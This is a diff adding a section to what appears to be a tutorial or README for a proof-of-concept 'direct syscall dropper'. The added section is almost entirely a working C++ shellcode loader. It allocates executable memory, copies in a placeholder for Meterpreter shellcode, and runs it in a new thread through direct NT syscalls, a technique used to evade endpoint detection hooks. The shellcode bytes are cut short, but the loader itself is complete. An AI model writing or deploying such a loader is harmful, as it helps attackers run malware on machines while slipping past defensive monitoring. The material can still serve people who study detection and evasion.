@@ -29,3 +29,43 @@ The code works as follows, shellcode declaration is the same as before in both d
 ```
     
 </details>
+
+
+The main code of the direct syscall dropper looks like the following and is already implemented in the POC. 
+<details>
+<summary>Code</summary>
+    
+```
+#include <iostream>
+#include <Windows.h>
+#include "syscalls.h"
+
+int main() {
+    // Insert Meterpreter shellcode
+    unsigned char code[] = "\xfc\x48\x83...";
+
+    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
+    // 'exec' will hold the base address of the allocated memory region
+    void* exec = NULL;
+    SIZE_T size = sizeof(code);
+    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    // Copy the shellcode into the allocated memory region
+    SIZE_T bytesWritten;
+    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
+
+    // Execute the shellcode in memory using a new thread
+    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
+    HANDLE hThread;
+    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);
+
+    // Wait for the end of the thread to ensure the shellcode execution is complete
+    NtWaitForSingleObject(hThread, FALSE, NULL);
+
+
+    // Return 0 as the main function exit code
+    return 0;
+}
+```
+    
+</details>
